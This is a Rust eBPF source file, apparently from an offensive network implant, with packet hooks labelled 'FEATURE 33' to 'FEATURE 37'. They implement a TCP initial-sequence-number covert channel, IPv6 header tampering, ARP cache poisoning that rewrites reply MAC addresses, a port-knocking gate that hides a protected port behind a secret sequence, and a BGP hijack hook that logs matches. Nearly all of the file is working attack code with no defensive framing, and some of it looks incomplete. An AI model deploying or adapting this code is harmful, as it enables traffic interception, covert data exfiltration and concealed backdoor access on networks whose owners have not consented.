use aya_ebpf::{
    bindings::xdp_action,
    helpers::bpf_ktime_get_ns,
    macros::{classifier, xdp},
    programs::{TcContext, XdpContext},
};
use common::{
    EventHeader, EVENT_ARP_POISONED, EVENT_BGP_HIJACK, EVENT_IPV6_EXT_ABUSE, EVENT_ISN_COVERT,
    EVENT_PORT_KNOCK_AUTH, PortKnockState,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 33: TCP ISN Covert Channel
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_isn_covert(ctx: TcContext) -> i32 {
    try_isn_covert(&ctx).unwrap_or(0)
}

fn try_isn_covert(ctx: &TcContext) -> Result<i32, i64> {
    let eth_proto = u16::from_be(unsafe {
        *((ctx.data() + 12) as *const u16)
    });
    if eth_proto != 0x0800 {
        return Ok(0);
    }

    let ip_hdr = ctx.data() + 14;
    let protocol: u8 = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(0);
    }

    let ihl = (unsafe { *((ip_hdr) as *const u8) } & 0x0F) as usize * 4;
    let tcp_hdr = ip_hdr + ihl;

    let flags: u8 = unsafe { *((tcp_hdr + 13) as *const u8) };
    if flags & 0x02 == 0 {
        return Ok(0);
    }

    let dst_ip: u32 = unsafe { *((ip_hdr + 16) as *const u32) };

    if let Some(&covert_data) = unsafe { ISN_COVERT_DATA.get(&dst_ip) } {
        let new_seq = covert_data ^ dst_ip;
        let seq_ptr = (tcp_hdr + 4) as *mut u32;
        unsafe {
            core::ptr::write_volatile(seq_ptr, new_seq.to_be());
        }

        let event = EventHeader {
            event_type: EVENT_ISN_COVERT,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: dst_ip as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 34: IPv6 Extension Header Abuse
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_ipv6_ext_abuse(ctx: TcContext) -> i32 {
    try_ipv6_ext_abuse(&ctx).unwrap_or(0)
}

fn try_ipv6_ext_abuse(ctx: &TcContext) -> Result<i32, i64> {
    let eth_proto = u16::from_be(unsafe {
        *((ctx.data() + 12) as *const u16)
    });
    if eth_proto != 0x86DD {
        return Ok(0);
    }

    let ipv6_hdr = ctx.data() + 14;
    let flow_label: u32 = unsafe { *((ipv6_hdr) as *const u32) };
    let key = flow_label & 0xFFFFF;

    if let Some(payload) = unsafe { IPV6_EXT_QUEUE.get(&key) } {
        let next_hdr_ptr = (ipv6_hdr + 6) as *mut u8;
        unsafe {
            core::ptr::write_volatile(next_hdr_ptr, 0);
        }

        let event = EventHeader {
            event_type: EVENT_IPV6_EXT_ABUSE,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: key as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 35: ARP Cache Poisoning
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_arp_poison(ctx: XdpContext) -> u32 {
    try_arp_poison(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_arp_poison(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    if data + 42 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let eth_proto = u16::from_be(unsafe { *((data + 12) as *const u16) });
    if eth_proto != 0x0806 {
        return Ok(xdp_action::XDP_PASS);
    }

    let arp_op = u16::from_be(unsafe { *((data + 20) as *const u16) });
    if arp_op != 2 {
        return Ok(xdp_action::XDP_PASS);
    }

    let sender_ip: u32 = unsafe { *((data + 28) as *const u32) };

    if let Some(fake_mac) = unsafe { ARP_POISON_TABLE.get(&sender_ip) } {
        let src_mac_ptr = (data + 22) as *mut [u8; 6];
        unsafe {
            core::ptr::copy_nonoverlapping(fake_mac.as_ptr(), (*src_mac_ptr).as_mut_ptr(), 6);
        }

        let eth_src_ptr = (data + 6) as *mut [u8; 6];
        unsafe {
            core::ptr::copy_nonoverlapping(fake_mac.as_ptr(), (*eth_src_ptr).as_mut_ptr(), 6);
        }

        let event = EventHeader {
            event_type: EVENT_ARP_POISONED,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: sender_ip as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 36: XDP Port Knocking Daemon
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_port_knock(ctx: XdpContext) -> u32 {
    try_port_knock(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_port_knock(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    if data + 54 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let eth_proto = u16::from_be(unsafe { *((data + 12) as *const u16) });
    if eth_proto != 0x0800 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_hdr = data + 14;
    let protocol: u8 = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ihl = (unsafe { *((ip_hdr) as *const u8) } & 0x0F) as usize * 4;
    let tcp_hdr = ip_hdr + ihl;

    if tcp_hdr + 20 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let flags: u8 = unsafe { *((tcp_hdr + 13) as *const u8) };
    if flags & 0x02 == 0 {
        return Ok(xdp_action::XDP_PASS);
    }

    let src_ip: u32 = unsafe { *((ip_hdr + 12) as *const u32) };
    let dst_port: u16 = u16::from_be(unsafe { *((tcp_hdr + 2) as *const u16) });

    let config = match unsafe { PORT_KNOCK_CONFIG.get(0) } {
        Some(c) => c,
        None => return Ok(xdp_action::XDP_PASS),
    };

    if unsafe { PORT_KNOCK_ALLOWED.get(&src_ip) }.is_some() {
        return Ok(xdp_action::XDP_PASS);
    }

    if dst_port == config.protected_port {
        return Ok(xdp_action::XDP_DROP);
    }

    let now = unsafe { bpf_ktime_get_ns() };

    let state = unsafe { PORT_KNOCK_SEQ.get(&src_ip) };
    let current_step = match state {
        Some(s) => {
            if now.saturating_sub(s.last_knock_ns) > config.timeout_ns {
                0u32
            } else {
                s.current_step
            }
        }
        None => 0u32,
    };

    if current_step < config.seq_len as u32 {
        let expected_port = config.sequence[current_step as usize];
        if dst_port == expected_port {
            let new_step = current_step + 1;
            if new_step >= config.seq_len as u32 {
                let _ = unsafe { PORT_KNOCK_ALLOWED.insert(&src_ip, &1u8, 0) };
                let _ = unsafe { PORT_KNOCK_SEQ.remove(&src_ip) };

                let event = EventHeader {
                    event_type: EVENT_PORT_KNOCK_AUTH,
                    pid: 0,
                    timestamp_ns: now,
                    context: src_ip as u64,
                };
                let _ = EVENTS.output(&event, 0);
            } else {
                let new_state = PortKnockState {
                    src_ip,
                    current_step: new_step,
                    last_knock_ns: now,
                };
                let _ = unsafe { PORT_KNOCK_SEQ.insert(&src_ip, &new_state, 0) };
            }
        } else if current_step > 0 {
            let _ = unsafe { PORT_KNOCK_SEQ.remove(&src_ip) };
        }
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 37: BGP Hijacking
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_bgp_hijack(ctx: TcContext) -> i32 {
    try_bgp_hijack(&ctx).unwrap_or(0)
}

fn try_bgp_hijack(ctx: &TcContext) -> Result<i32, i64> {
    let eth_proto = u16::from_be(unsafe {
        *((ctx.data() + 12) as *const u16)
    });
    if eth_proto != 0x0800 {
        return Ok(0);
    }

    let ip_hdr = ctx.data() + 14;
    let protocol: u8 = unsafe { *((ip_hdr + 9) as *const u8) };
    if protocol != 6 {
        return Ok(0);
    }

    let ihl = (unsafe { *((ip_hdr) as *const u8) } & 0x0F) as usize * 4;
    let tcp_hdr = ip_hdr + ihl;

    let dst_port: u16 = u16::from_be(unsafe { *((tcp_hdr + 2) as *const u16) });
    if dst_port != 179 {
        return Ok(0);
    }

    let dst_ip: u32 = unsafe { *((ip_hdr + 16) as *const u32) };

    if let Some(entry) = unsafe { BGP_HIJACK_PREFIXES.get(&dst_ip) } {
        let event = EventHeader {
            event_type: EVENT_BGP_HIJACK,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: entry.prefix as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
